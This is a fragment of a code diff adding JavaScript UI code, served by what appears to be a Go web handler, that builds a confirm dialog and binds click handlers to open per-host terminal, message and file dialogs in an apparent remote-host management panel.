+        okButton.style.cursor = "pointer";
+
+        // 取消按钮
+        let cancelButton = document.createElement("button");
+        cancelButton.textContent = "no";
+        cancelButton.style.width = "90px";
+        cancelButton.style.padding = "8px";
+        cancelButton.style.border = "none";
+        cancelButton.style.borderRadius = "6px";
+        cancelButton.style.background = "#ddd";
+        cancelButton.style.color = "#333";
+        cancelButton.style.cursor = "pointer";
+
+        function close(result){
+            document.body.removeChild(overlay);
+            resolve(result);
+        }
+        okButton.onclick = () => {
+            close(true);
+        };
+
+        cancelButton.onclick = () => {
+            close(false);
+        };
+
+        buttonBox.appendChild(okButton);
+        buttonBox.appendChild(cancelButton);
+
+        confirmBox.appendChild(buttonBox);
+
+        overlay.appendChild(confirmBox);
+        document.body.appendChild(overlay);
+        // 点击外部关闭
+        overlay.onclick = function(e){
+            if(e.target === overlay){
+                close(false);
+            }
+        };
+
+    });
+}
+
 window.lainIndex = new lain_index();
 window.showTerminalDialog = function(uid, host, os) {
     // 这里要用你的类实例，比如
@@ -2763,6 +4566,21 @@ window.showMsgDialog = function(uid, host) {
         window.lainIndex.showMsgDialog(uid, host);
     }
 };
+if (!window.fileDialogButtonBound) {
+    document.addEventListener("click", function(event) {
+        const button = event.target.closest(".file-open-btn");
+        if (!button) {
+            return;
+        }
+        const uid = button.dataset.uid || "";
+        const host = button.dataset.host || "";
+        const dir = button.dataset.dir || "./";
+        if (window.lainIndex) {
+            window.lainIndex.showFileDialog(uid, host, dir);
+        }
+    });
+    window.fileDialogButtonBound = true;
+}
 `
 
 			w.Header().Set("Content-Type", "text/javascript")
